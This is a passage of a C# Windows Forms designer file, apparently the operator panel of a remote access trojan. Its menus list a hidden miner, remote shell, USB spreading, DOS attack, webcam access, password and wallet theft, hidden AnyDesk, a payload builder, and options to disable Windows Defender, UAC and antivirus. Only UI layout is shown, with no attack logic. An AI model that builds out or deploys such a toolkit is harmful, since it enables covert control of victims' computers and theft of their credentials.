            // walletsToolStripMenuItem
            // 
            this.walletsToolStripMenuItem.Name = "walletsToolStripMenuItem";
            this.walletsToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.walletsToolStripMenuItem.Text = "Wallets";
            this.walletsToolStripMenuItem.Click += new System.EventHandler(this.walletsToolStripMenuItem_Click_1);
            // 
            // processManagerToolStripMenuItem1
            // 
            this.processManagerToolStripMenuItem1.Name = "processManagerToolStripMenuItem1";
            this.processManagerToolStripMenuItem1.Size = new System.Drawing.Size(164, 22);
            this.processManagerToolStripMenuItem1.Text = "Process Manager";
            this.processManagerToolStripMenuItem1.Click += new System.EventHandler(this.ProcessManagerToolStripMenuItem1_Click);
            // 
            // killProcessToolStripMenuItem
            // 
            this.killProcessToolStripMenuItem.Name = "killProcessToolStripMenuItem";
            this.killProcessToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.killProcessToolStripMenuItem.Text = "Kill Process";
            this.killProcessToolStripMenuItem.Click += new System.EventHandler(this.killProcessToolStripMenuItem_Click);
            // 
            // reportWindowToolStripMenuItem
            // 
            this.reportWindowToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.runToolStripMenuItem1,
            this.stopToolStripMenuItem2});
            this.reportWindowToolStripMenuItem.Name = "reportWindowToolStripMenuItem";
            this.reportWindowToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.reportWindowToolStripMenuItem.Text = "Report Window";
            // 
            // runToolStripMenuItem1
            // 
            this.runToolStripMenuItem1.Name = "runToolStripMenuItem1";
            this.runToolStripMenuItem1.Size = new System.Drawing.Size(98, 22);
            this.runToolStripMenuItem1.Text = "Run";
            this.runToolStripMenuItem1.Click += new System.EventHandler(this.RunToolStripMenuItem1_Click);
            // 
            // stopToolStripMenuItem2
            // 
            this.stopToolStripMenuItem2.Name = "stopToolStripMenuItem2";
            this.stopToolStripMenuItem2.Size = new System.Drawing.Size(98, 22);
            this.stopToolStripMenuItem2.Text = "Stop";
            this.stopToolStripMenuItem2.Click += new System.EventHandler(this.StopToolStripMenuItem2_Click);
            // 
            // webcamToolStripMenuItem
            // 
            this.webcamToolStripMenuItem.Name = "webcamToolStripMenuItem";
            this.webcamToolStripMenuItem.Size = new System.Drawing.Size(164, 22);
            this.webcamToolStripMenuItem.Text = "Webcam";
            this.webcamToolStripMenuItem.Click += new System.EventHandler(this.WebcamToolStripMenuItem_Click);
            // 
            // blockSiteToolStripMenuItem1
            // 
            this.blockSiteToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.blockToolStripMenuItem,
            this.resetToolStripMenuItem});
            this.blockSiteToolStripMenuItem1.Name = "blockSiteToolStripMenuItem1";
            this.blockSiteToolStripMenuItem1.Size = new System.Drawing.Size(164, 22);
            this.blockSiteToolStripMenuItem1.Text = "BlockSite";
            // 
            // blockToolStripMenuItem
            // 
            this.blockToolStripMenuItem.Name = "blockToolStripMenuItem";
            this.blockToolStripMenuItem.Size = new System.Drawing.Size(103, 22);
            this.blockToolStripMenuItem.Text = "Block";
            this.blockToolStripMenuItem.Click += new System.EventHandler(this.blockToolStripMenuItem_Click);
            // 
            // resetToolStripMenuItem
            // 
            this.resetToolStripMenuItem.Name = "resetToolStripMenuItem";
            this.resetToolStripMenuItem.Size = new System.Drawing.Size(103, 22);
            this.resetToolStripMenuItem.Text = "Reset";
            this.resetToolStripMenuItem.Click += new System.EventHandler(this.resetToolStripMenuItem_Click);
            // 
            // webBrowserPassViewToolStripMenuItem
            // 
            this.webBrowserPassViewToolStripMenuItem.Name = "webBrowserPassViewToolStripMenuItem";
            this.webBrowserPassViewToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.webBrowserPassViewToolStripMenuItem.Text = "Pass RxR  ";
            this.webBrowserPassViewToolStripMenuItem.Click += new System.EventHandler(this.webBrowserPassViewToolStripMenuItem_Click_1);
            // 
            // allInOneRecoveryToolStripMenuItem1
            // 
            this.allInOneRecoveryToolStripMenuItem1.Name = "allInOneRecoveryToolStripMenuItem1";
            this.allInOneRecoveryToolStripMenuItem1.Size = new System.Drawing.Size(173, 22);
            this.allInOneRecoveryToolStripMenuItem1.Text = "AllInOne";
            this.allInOneRecoveryToolStripMenuItem1.Click += new System.EventHandler(this.allInOneRecoveryToolStripMenuItem1_Click);
            // 
            // miscellaneousToolStripMenuItem
            // 
            this.miscellaneousToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.remoteShellToolStripMenuItem1,
            this.botsKillerToolStripMenuItem,
            this.uSBSpreadToolStripMenuItem1,
            this.seedTorrentToolStripMenuItem1,
            this.dOSAttackToolStripMenuItem,
            this.executeNETCodeToolStripMenuItem,
            this.xMRMinerToolStripMenuItem,
            this.filesSearcherToolStripMenuItem,
            this.reverseProxyToolStripMenuItem});
            this.miscellaneousToolStripMenuItem.Name = "miscellaneousToolStripMenuItem";
            this.miscellaneousToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.miscellaneousToolStripMenuItem.Text = "Miscellaneous";
            // 
            // remoteShellToolStripMenuItem1
            // 
            this.remoteShellToolStripMenuItem1.Name = "remoteShellToolStripMenuItem1";
            this.remoteShellToolStripMenuItem1.Size = new System.Drawing.Size(173, 22);
            this.remoteShellToolStripMenuItem1.Text = "Cmd / Powershell";
            this.remoteShellToolStripMenuItem1.Click += new System.EventHandler(this.RemoteShellToolStripMenuItem1_Click_1);
            // 
            // botsKillerToolStripMenuItem
            // 
            this.botsKillerToolStripMenuItem.Name = "botsKillerToolStripMenuItem";
            this.botsKillerToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.botsKillerToolStripMenuItem.Text = "Bots Killer";
            this.botsKillerToolStripMenuItem.Click += new System.EventHandler(this.BotsKillerToolStripMenuItem_Click);
            // 
            // uSBSpreadToolStripMenuItem1
            // 
            this.uSBSpreadToolStripMenuItem1.Name = "uSBSpreadToolStripMenuItem1";
            this.uSBSpreadToolStripMenuItem1.Size = new System.Drawing.Size(173, 22);
            this.uSBSpreadToolStripMenuItem1.Text = "USB Spread";
            this.uSBSpreadToolStripMenuItem1.Click += new System.EventHandler(this.USBSpreadToolStripMenuItem1_Click);
            // 
            // seedTorrentToolStripMenuItem1
            // 
            this.seedTorrentToolStripMenuItem1.Name = "seedTorrentToolStripMenuItem1";
            this.seedTorrentToolStripMenuItem1.Size = new System.Drawing.Size(173, 22);
            this.seedTorrentToolStripMenuItem1.Text = "Seed Torrent";
            this.seedTorrentToolStripMenuItem1.Click += new System.EventHandler(this.SeedTorrentToolStripMenuItem1_Click_1);
            // 
            // dOSAttackToolStripMenuItem
            // 
            this.dOSAttackToolStripMenuItem.Name = "dOSAttackToolStripMenuItem";
            this.dOSAttackToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.dOSAttackToolStripMenuItem.Text = "DOS Attack";
            this.dOSAttackToolStripMenuItem.Click += new System.EventHandler(this.DOSAttackToolStripMenuItem_Click_1);
            // 
            // executeNETCodeToolStripMenuItem
            // 
            this.executeNETCodeToolStripMenuItem.Name = "executeNETCodeToolStripMenuItem";
            this.executeNETCodeToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.executeNETCodeToolStripMenuItem.Text = "Execute .NET Code";
            this.executeNETCodeToolStripMenuItem.Click += new System.EventHandler(this.ExecuteNETCodeToolStripMenuItem_Click_1);
            // 
            // xMRMinerToolStripMenuItem
            // 
            this.xMRMinerToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.runToolStripMenuItem,
            this.killToolStripMenuItem});
            this.xMRMinerToolStripMenuItem.Name = "xMRMinerToolStripMenuItem";
            this.xMRMinerToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.xMRMinerToolStripMenuItem.Text = "XMR Miner";
            this.xMRMinerToolStripMenuItem.Visible = false;
            // 
            // runToolStripMenuItem
            // 
            this.runToolStripMenuItem.Name = "runToolStripMenuItem";
            this.runToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
            this.runToolStripMenuItem.Text = "Run";
            this.runToolStripMenuItem.Click += new System.EventHandler(this.RunToolStripMenuItem_Click);
            // 
            // killToolStripMenuItem
            // 
            this.killToolStripMenuItem.Name = "killToolStripMenuItem";
            this.killToolStripMenuItem.Size = new System.Drawing.Size(98, 22);
            this.killToolStripMenuItem.Text = "Stop";
            this.killToolStripMenuItem.Click += new System.EventHandler(this.KillToolStripMenuItem_Click);
            // 
            // filesSearcherToolStripMenuItem
            // 
            this.filesSearcherToolStripMenuItem.Name = "filesSearcherToolStripMenuItem";
            this.filesSearcherToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.filesSearcherToolStripMenuItem.Text = "Files Searcher";
            this.filesSearcherToolStripMenuItem.Click += new System.EventHandler(this.filesSearcherToolStripMenuItem_Click);
            // 
            // reverseProxyToolStripMenuItem
            // 
            this.reverseProxyToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startToolStripMenuItem1,
            this.stopToolStripMenuItem3});
            this.reverseProxyToolStripMenuItem.Name = "reverseProxyToolStripMenuItem";
            this.reverseProxyToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.reverseProxyToolStripMenuItem.Text = "BackProxy";
            // 
            // startToolStripMenuItem1
            // 
            this.startToolStripMenuItem1.Name = "startToolStripMenuItem1";
            this.startToolStripMenuItem1.Size = new System.Drawing.Size(98, 22);
            this.startToolStripMenuItem1.Text = "Start";
            this.startToolStripMenuItem1.Click += new System.EventHandler(this.startToolStripMenuItem1_Click);
            // 
            // stopToolStripMenuItem3
            // 
            this.stopToolStripMenuItem3.Name = "stopToolStripMenuItem3";
            this.stopToolStripMenuItem3.Size = new System.Drawing.Size(98, 22);
            this.stopToolStripMenuItem3.Text = "Stop";
            this.stopToolStripMenuItem3.Click += new System.EventHandler(this.stopToolStripMenuItem3_Click_1);
            // 
            // extraToolStripMenuItem
            // 
            this.extraToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.visitWebsiteToolStripMenuItem1,
            this.saToolStripMenuItem,
            this.sendMessageBoxToolStripMenuItem1,
            this.chatToolStripMenuItem1,
            this.getAdminPrivilegesToolStripMenuItem,
            this.blankScreenToolStripMenuItem,
            this.disableWindowsDefenderToolStripMenuItem,
            this.disableUACToolStripMenuItem,
            this.avastRemovalToolStripMenuItem,
            this.setWallpaperToolStripMenuItem,
            this.getscreenToolStripMenuItem,
            this.toolStripMenuItem_1,
            this.net35InstallToolStripMenuItem});
            this.extraToolStripMenuItem.Name = "extraToolStripMenuItem";
            this.extraToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.extraToolStripMenuItem.Text = "Extra";
            // 
            // visitWebsiteToolStripMenuItem1
            // 
            this.visitWebsiteToolStripMenuItem1.Name = "visitWebsiteToolStripMenuItem1";
            this.visitWebsiteToolStripMenuItem1.Size = new System.Drawing.Size(215, 22);
            this.visitWebsiteToolStripMenuItem1.Text = "Visit Website";
            this.visitWebsiteToolStripMenuItem1.Click += new System.EventHandler(this.VisitWebsiteToolStripMenuItem1_Click);
            // 
            // saToolStripMenuItem
            // 
            this.saToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.backToolStripMenuItem});
            this.saToolStripMenuItem.Name = "saToolStripMenuItem";
            this.saToolStripMenuItem.Size = new System.Drawing.Size(215, 22);
            this.saToolStripMenuItem.Text = "AsyncColors";
            this.saToolStripMenuItem.Click += new System.EventHandler(this.saToolStripMenuItem_Click_1);
            // 
            // backToolStripMenuItem
            // 
            this.backToolStripMenuItem.Name = "backToolStripMenuItem";
            this.backToolStripMenuItem.Size = new System.Drawing.Size(99, 22);
            this.backToolStripMenuItem.Text = "back";
            this.backToolStripMenuItem.Click += new System.EventHandler(this.backToolStripMenuItem_Click);
            // 
            // sendMessageBoxToolStripMenuItem1
            // 
            this.sendMessageBoxToolStripMenuItem1.Name = "sendMessageBoxToolStripMenuItem1";
            this.sendMessageBoxToolStripMenuItem1.Size = new System.Drawing.Size(215, 22);
            this.sendMessageBoxToolStripMenuItem1.Text = "Send MessageBox";
            this.sendMessageBoxToolStripMenuItem1.Click += new System.EventHandler(this.SendMessageBoxToolStripMenuItem1_Click);
            // 
            // chatToolStripMenuItem1
            // 
            this.chatToolStripMenuItem1.Name = "chatToolStripMenuItem1";
            this.chatToolStripMenuItem1.Size = new System.Drawing.Size(215, 22);
            this.chatToolStripMenuItem1.Text = "Chat";
            this.chatToolStripMenuItem1.Click += new System.EventHandler(this.ChatToolStripMenuItem1_Click);
            // 
            // getAdminPrivilegesToolStripMenuItem
            // 
            this.getAdminPrivilegesToolStripMenuItem.Name = "getAdminPrivilegesToolStripMenuItem";
            this.getAdminPrivilegesToolStripMenuItem.Size = new System.Drawing.Size(215, 22);
            this.getAdminPrivilegesToolStripMenuItem.Text = "Get Admin Privileges";
            this.getAdminPrivilegesToolStripMenuItem.Click += new System.EventHandler(this.GetAdminPrivilegesToolStripMenuItem_Click_1);
            // 
            // blankScreenToolStripMenuItem
            // 
            this.blankScreenToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.runToolStripMenuItem2,
            this.stopToolStripMenuItem1});
            this.blankScreenToolStripMenuItem.Name = "blankScreenToolStripMenuItem";
            this.blankScreenToolStripMenuItem.Size = new System.Drawing.Size(215, 22);
            this.blankScreenToolStripMenuItem.Text = "Blank Screen";
            // 
            // runToolStripMenuItem2
            // 
            this.runToolStripMenuItem2.Name = "runToolStripMenuItem2";
            this.runToolStripMenuItem2.Size = new System.Drawing.Size(98, 22);
            this.runToolStripMenuItem2.Text = "Run";
            this.runToolStripMenuItem2.Click += new System.EventHandler(this.RunToolStripMenuItem2_Click);
            // 
            // stopToolStripMenuItem1
            // 
            this.stopToolStripMenuItem1.Name = "stopToolStripMenuItem1";
            this.stopToolStripMenuItem1.Size = new System.Drawing.Size(98, 22);
            this.stopToolStripMenuItem1.Text = "Stop";
            this.stopToolStripMenuItem1.Click += new System.EventHandler(this.StopToolStripMenuItem1_Click);
            // 
            // disableWindowsDefenderToolStripMenuItem
            // 
            this.disableWindowsDefenderToolStripMenuItem.Name = "disableWindowsDefenderToolStripMenuItem";
            this.disableWindowsDefenderToolStripMenuItem.Size = new System.Drawing.Size(215, 22);
            this.disableWindowsDefenderToolStripMenuItem.Text = "Disable Windows Defender";
            this.disableWindowsDefenderToolStripMenuItem.Click += new System.EventHandler(this.DisableWindowsDefenderToolStripMenuItem_Click_1);
            // 
            // disableUACToolStripMenuItem
            // 
            this.disableUACToolStripMenuItem.Name = "disableUACToolStripMenuItem";
            this.disableUACToolStripMenuItem.Size = new System.Drawing.Size(215, 22);
            this.disableUACToolStripMenuItem.Text = "Disable UAC";
            this.disableUACToolStripMenuItem.Click += new System.EventHandler(this.disableUACToolStripMenuItem_Click);
            // 
            // avastRemovalToolStripMenuItem
            // 
            this.avastRemovalToolStripMenuItem.Name = "avastRemovalToolStripMenuItem";
            this.avastRemovalToolStripMenuItem.Size = new System.Drawing.Size(215, 22);
            this.avastRemovalToolStripMenuItem.Text = "AV Removal";
            this.avastRemovalToolStripMenuItem.Click += new System.EventHandler(this.avastRemovalToolStripMenuItem_Click);
            // 
            // setWallpaperToolStripMenuItem
            // 
            this.setWallpaperToolStripMenuItem.Name = "setWallpaperToolStripMenuItem";
            this.setWallpaperToolStripMenuItem.Size = new System.Drawing.Size(215, 22);
            this.setWallpaperToolStripMenuItem.Text = "Set Wallpaper";
            this.setWallpaperToolStripMenuItem.Click += new System.EventHandler(this.setWallpaperToolStripMenuItem_Click);
            // 
            // getscreenToolStripMenuItem
            // 
            this.getscreenToolStripMenuItem.Name = "getscreenToolStripMenuItem";
            this.getscreenToolStripMenuItem.Size = new System.Drawing.Size(215, 22);
            this.getscreenToolStripMenuItem.Text = "GetScreen";
            this.getscreenToolStripMenuItem.Click += new System.EventHandler(this.getscreenToolStripMenuItem_Click);
            // 
            // toolStripMenuItem_1
            // 
            this.toolStripMenuItem_1.Name = "toolStripMenuItem_1";
            this.toolStripMenuItem_1.Size = new System.Drawing.Size(215, 22);
            this.toolStripMenuItem_1.Text = "WDExclusion";
            this.toolStripMenuItem_1.Click += new System.EventHandler(this.wDToolStripMenuItem_Click);
            // 
            // net35InstallToolStripMenuItem
            // 
            this.net35InstallToolStripMenuItem.Name = "net35InstallToolStripMenuItem";
            this.net35InstallToolStripMenuItem.Size = new System.Drawing.Size(215, 22);
            this.net35InstallToolStripMenuItem.Text = ".Net 3.5 Install";
            this.net35InstallToolStripMenuItem.Click += new System.EventHandler(this.net35InstallToolStripMenuItem_Click);
            // 
            // systemToolStripMenuItem
            // 
            this.systemToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.clientToolStripMenuItem,
            this.toolStripMenuItem_0});
            this.systemToolStripMenuItem.Name = "systemToolStripMenuItem";
            this.systemToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.systemToolStripMenuItem.Text = "Client Managment";
            // 
            // clientToolStripMenuItem
            // 
            this.clientToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.closeToolStripMenuItem1,
            this.restartToolStripMenuItem2,
            this.updateToolStripMenuItem2,
            this.uninstallToolStripMenuItem});
            this.clientToolStripMenuItem.Name = "clientToolStripMenuItem";
            this.clientToolStripMenuItem.Size = new System.Drawing.Size(105, 22);
            this.clientToolStripMenuItem.Text = "Client";
            // 
            // closeToolStripMenuItem1
            // 
            this.closeToolStripMenuItem1.Name = "closeToolStripMenuItem1";
            this.closeToolStripMenuItem1.Size = new System.Drawing.Size(120, 22);
            this.closeToolStripMenuItem1.Text = "Close";
            this.closeToolStripMenuItem1.Click += new System.EventHandler(this.CloseToolStripMenuItem1_Click);
            // 
            // restartToolStripMenuItem2
            // 
            this.restartToolStripMenuItem2.Name = "restartToolStripMenuItem2";
            this.restartToolStripMenuItem2.Size = new System.Drawing.Size(120, 22);
            this.restartToolStripMenuItem2.Text = "Restart";
            this.restartToolStripMenuItem2.Click += new System.EventHandler(this.RestartToolStripMenuItem2_Click);
            // 
            // updateToolStripMenuItem2
            // 
            this.updateToolStripMenuItem2.Name = "updateToolStripMenuItem2";
            this.updateToolStripMenuItem2.Size = new System.Drawing.Size(120, 22);
            this.updateToolStripMenuItem2.Text = "Update";
            this.updateToolStripMenuItem2.Click += new System.EventHandler(this.UpdateToolStripMenuItem2_Click);
            // 
            // uninstallToolStripMenuItem
            // 
            this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
            this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(120, 22);
            this.uninstallToolStripMenuItem.Text = "Uninstall";
            this.uninstallToolStripMenuItem.Click += new System.EventHandler(this.UninstallToolStripMenuItem_Click);
            // 
            // toolStripMenuItem_0
            // 
            this.toolStripMenuItem_0.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.logoffToolStripMenuItem1,
            this.restartToolStripMenuItem3,
            this.shutdownToolStripMenuItem1});
            this.toolStripMenuItem_0.Name = "toolStripMenuItem_0";
            this.toolStripMenuItem_0.Size = new System.Drawing.Size(105, 22);
            this.toolStripMenuItem_0.Text = "PC";
            // 
            // logoffToolStripMenuItem1
            // 
            this.logoffToolStripMenuItem1.Name = "logoffToolStripMenuItem1";
            this.logoffToolStripMenuItem1.Size = new System.Drawing.Size(128, 22);
            this.logoffToolStripMenuItem1.Text = "Logoff";
            this.logoffToolStripMenuItem1.Click += new System.EventHandler(this.LogoffToolStripMenuItem1_Click);
            // 
            // restartToolStripMenuItem3
            // 
            this.restartToolStripMenuItem3.Name = "restartToolStripMenuItem3";
            this.restartToolStripMenuItem3.Size = new System.Drawing.Size(128, 22);
            this.restartToolStripMenuItem3.Text = "Restart";
            this.restartToolStripMenuItem3.Click += new System.EventHandler(this.RestartToolStripMenuItem3_Click);
            // 
            // shutdownToolStripMenuItem1
            // 
            this.shutdownToolStripMenuItem1.Name = "shutdownToolStripMenuItem1";
            this.shutdownToolStripMenuItem1.Size = new System.Drawing.Size(128, 22);
            this.shutdownToolStripMenuItem1.Text = "Shutdown";
            this.shutdownToolStripMenuItem1.Click += new System.EventHandler(this.ShutdownToolStripMenuItem1_Click);
            // 
            // toolStripSeparator1
            // 
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(170, 6);
            // 
            // backProxyUIToolStripMenuItem
            // 
            this.backProxyUIToolStripMenuItem.Name = "backProxyUIToolStripMenuItem";
            this.backProxyUIToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.backProxyUIToolStripMenuItem.Text = "BackProxyUI";
            this.backProxyUIToolStripMenuItem.Click += new System.EventHandler(this.backProxyUIToolStripMenuItem_Click);
            // 
            // serverToolStripMenuItem
            // 
            this.serverToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.blockClientsToolStripMenuItem});
            this.serverToolStripMenuItem.Name = "serverToolStripMenuItem";
            this.serverToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.serverToolStripMenuItem.Text = "Server";
            // 
            // blockClientsToolStripMenuItem
            // 
            this.blockClientsToolStripMenuItem.Name = "blockClientsToolStripMenuItem";
            this.blockClientsToolStripMenuItem.Size = new System.Drawing.Size(142, 22);
            this.blockClientsToolStripMenuItem.Text = "Block Clients";
            this.blockClientsToolStripMenuItem.Click += new System.EventHandler(this.BlockClientsToolStripMenuItem_Click);
            // 
            // toolStripSeparator5
            // 
            this.toolStripSeparator5.Name = "toolStripSeparator5";
            this.toolStripSeparator5.Size = new System.Drawing.Size(170, 6);
            // 
            // hiddenAnydeskToolStripMenuItem
            // 
            this.hiddenAnydeskToolStripMenuItem.Name = "hiddenAnydeskToolStripMenuItem";
            this.hiddenAnydeskToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.hiddenAnydeskToolStripMenuItem.Text = "HiddenAnydesk";
            this.hiddenAnydeskToolStripMenuItem.Click += new System.EventHandler(this.hiddenAnydeskToolStripMenuItem_Click_1);
            // 
            // bUILDERToolStripMenuItem
            // 
            this.bUILDERToolStripMenuItem.Name = "bUILDERToolStripMenuItem";
            this.bUILDERToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.bUILDERToolStripMenuItem.Text = "BUILDER";
            this.bUILDERToolStripMenuItem.Click += new System.EventHandler(this.bUILDERToolStripMenuItem_Click);
            // 
            // renameToolStripMenuItem
            // 
            this.renameToolStripMenuItem.Name = "renameToolStripMenuItem";
            this.renameToolStripMenuItem.Size = new System.Drawing.Size(173, 22);
            this.renameToolStripMenuItem.Text = "Rename";
            this.renameToolStripMenuItem.Click += new System.EventHandler(this.renameToolStripMenuItem_Click);
            // 
            // showFolderToolStripMenuItem1
            // 
            this.showFolderToolStripMenuItem1.Name = "showFolderToolStripMenuItem1";
            this.showFolderToolStripMenuItem1.Size = new System.Drawing.Size(173, 22);
            this.showFolderToolStripMenuItem1.Text = "Show Folder";
            this.showFolderToolStripMenuItem1.Click += new System.EventHandler(this.showFolderToolStripMenuItem1_Click);
            // 
            // statusStrip1
            // 
            this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripStatusLabel2,
            this.toolStripStatusLabel1});
            this.statusStrip1.Location = new System.Drawing.Point(0, 349);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
            this.statusStrip1.Size = new System.Drawing.Size(1283, 22);
            this.statusStrip1.TabIndex = 1;
            this.statusStrip1.Text = "statusStrip1";
            // 
            // toolStripStatusLabel2
            // 
            this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
            this.toolStripStatusLabel2.Size = new System.Drawing.Size(117, 17);
            this.toolStripStatusLabel2.Text = "[Notification]             ";
            this.toolStripStatusLabel2.Click += new System.EventHandler(this.ToolStripStatusLabel2_Click);
            // 
            // toolStripStatusLabel1
            // 
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(16, 17);
            this.toolStripStatusLabel1.Text = "...";
            // 
            // ping
            // 
            this.ping.Enabled = true;
            this.ping.Interval = 30000;
            this.ping.Tick += new System.EventHandler(this.ping_Tick);
            // 
            // UpdateUI
            // 
            this.UpdateUI.Enabled = true;
            this.UpdateUI.Interval = 500;
            this.UpdateUI.Tick += new System.EventHandler(this.UpdateUI_Tick);
            // 
            // tabControl1
            // 
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage2);
            this.tabControl1.Controls.Add(this.tabPage3);
            this.tabControl1.Controls.Add(this.tabPage4);
            this.tabControl1.Controls.Add(this.tabPage5);
            this.tabControl1.Controls.Add(this.tabPage6);
            this.tabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.tabControl1.Location = new System.Drawing.Point(0, 0);
            this.tabControl1.Margin = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(1283, 349);
            this.tabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.tabControl1.TabIndex = 2;
            // 
            // tabPage1
            // 
            this.tabPage1.Controls.Add(this.listView1);
            this.tabPage1.Location = new System.Drawing.Point(4, 22);
            this.tabPage1.Margin = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.tabPage1.Size = new System.Drawing.Size(1275, 323);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Clients";
            // 
            // tabPage2
            // 
            this.tabPage2.Controls.Add(this.listView2);
            this.tabPage2.Location = new System.Drawing.Point(4, 22);
            this.tabPage2.Margin = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.tabPage2.Size = new System.Drawing.Size(1275, 323);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Logs";
            this.tabPage2.UseVisualStyleBackColor = true;
            // 
            // listView2
            // 
            this.listView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2});
            this.listView2.ContextMenuStrip = this.contextMenuLogs;
            this.listView2.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView2.FullRowSelect = true;
            this.listView2.GridLines = true;
            this.listView2.HideSelection = false;
            this.listView2.Location = new System.Drawing.Point(2, 1);
            this.listView2.Margin = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.listView2.Name = "listView2";
            this.listView2.ShowGroups = false;
            this.listView2.ShowItemToolTips = true;
            this.listView2.Size = new System.Drawing.Size(1271, 321);
            this.listView2.TabIndex = 1;
            this.listView2.UseCompatibleStateImageBehavior = false;
            this.listView2.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Time";
            this.columnHeader1.Width = 150;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "Message";
            this.columnHeader2.Width = 1078;
            // 
            // contextMenuLogs
            // 
            this.contextMenuLogs.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.contextMenuLogs.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cLEARToolStripMenuItem});
            this.contextMenuLogs.Name = "contextMenuLogs";
            this.contextMenuLogs.ShowImageMargin = false;
            this.contextMenuLogs.Size = new System.Drawing.Size(85, 26);
            // 
            // cLEARToolStripMenuItem
            // 
            this.cLEARToolStripMenuItem.Name = "cLEARToolStripMenuItem";
            this.cLEARToolStripMenuItem.Size = new System.Drawing.Size(84, 22);
            this.cLEARToolStripMenuItem.Text = "CLEAR";
            this.cLEARToolStripMenuItem.Click += new System.EventHandler(this.CLEARToolStripMenuItem_Click);
            // 
            // tabPage3
            // 
            this.tabPage3.Controls.Add(this.listView3);
            this.tabPage3.Location = new System.Drawing.Point(4, 22);
            this.tabPage3.Margin = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Size = new System.Drawing.Size(1275, 323);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "Thumbnail";
            this.tabPage3.UseVisualStyleBackColor = true;
            // 
            // listView3
            // 
            this.listView3.ContextMenuStrip = this.contextMenuThumbnail;
            this.listView3.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView3.HideSelection = false;
            this.listView3.LargeImageList = this.ThumbnailImageList;
            this.listView3.Location = new System.Drawing.Point(0, 0);
            this.listView3.Margin = new System.Windows.Forms.Padding(2, 1, 2, 1);
            this.listView3.Name = "listView3";
            this.listView3.ShowItemToolTips = true;
            this.listView3.Size = new System.Drawing.Size(1275, 323);
            this.listView3.SmallImageList = this.ThumbnailImageList;
            this.listView3.TabIndex = 0;
            this.listView3.UseCompatibleStateImageBehavior = false;
            // 
            // contextMenuThumbnail
            // 
            this.contextMenuThumbnail.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.contextMenuThumbnail.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.sTARTToolStripMenuItem,
            this.sTOPToolStripMenuItem});
            this.contextMenuThumbnail.Name = "contextMenuStrip2";
